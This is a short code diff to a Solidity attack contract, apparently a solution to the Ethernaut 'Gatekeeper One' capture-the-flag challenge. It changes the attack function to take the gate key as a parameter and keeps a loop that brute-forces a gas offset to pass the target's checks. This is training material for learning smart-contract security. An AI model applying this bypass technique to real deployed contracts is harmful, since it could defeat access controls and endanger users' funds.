@@ -12,11 +12,9 @@ contract GatekeeperOneAttack is GatekeeperOne {
         gatekeeperOne = GatekeeperOne(_gatekeeperContract);
     }
 
-    function attack() public {
-        bytes8 gateKey = bytes8(uint64(uint160(tx.origin))) &
-            0xFFFFFFFF0000FFFF;
+    function attack(bytes8 _gateKey) public {
         for (uint256 i = 0; i <= 300; i++) {
-            try gatekeeperOne.enter{gas: i + 8191 * 4}(gateKey) {
+            try gatekeeperOne.enter{gas: i + 8191 * 4}(_gateKey) {
                 break;
             } catch {}
         }
